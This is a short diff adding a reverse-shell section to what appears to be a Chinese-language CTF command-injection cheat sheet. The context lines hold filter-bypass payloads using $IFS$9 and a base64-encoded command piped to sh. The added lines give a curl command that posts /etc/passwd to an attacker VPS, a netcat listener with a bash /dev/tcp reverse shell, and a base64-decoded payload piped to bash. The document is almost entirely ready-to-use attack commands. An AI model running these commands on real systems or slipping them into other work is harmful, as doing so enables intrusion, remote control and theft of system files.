@@ -55,3 +55,13 @@ cat$IFS$9`ls`
 ```
 echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
 ```
+## 反弹shell相关
+1. 读取linux文件 
+   ```curl -F "x=`cat /etc/passwd`" http://{your_vps}```
+2. 反弹shell
+   attack  `nc -lvp 2333`
+   target  `bash -i >& /dev/tcp/{your_vps_ip}/2333 0>&1`
+   
+3. base64反弹shell
+   target  `echo {base64encode_shell}|base64 -d|bash`
+  
